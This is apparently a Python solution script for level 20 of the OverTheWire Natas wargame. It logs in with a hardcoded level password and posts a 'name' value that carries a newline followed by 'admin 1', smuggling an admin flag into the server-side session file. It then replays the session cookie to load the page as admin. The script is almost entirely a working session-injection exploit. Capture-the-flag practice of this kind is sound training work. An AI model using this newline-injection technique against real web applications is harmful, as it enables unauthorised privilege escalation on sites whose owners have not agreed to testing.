import requests
import re

username = "natas20"
password = 'guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH'


url = "http://%s.natas.labs.overthewire.org/?debug=true" % username

session = requests.Session()

response  = session.post(url,data={"name":"nimesh\nadmin 1"},auth=(username,password))
cookies = session.cookies["PHPSESSID"]

response = session.post(url,auth=(username,password),cookies={"PHPSESSID":cookies})

print(response.text)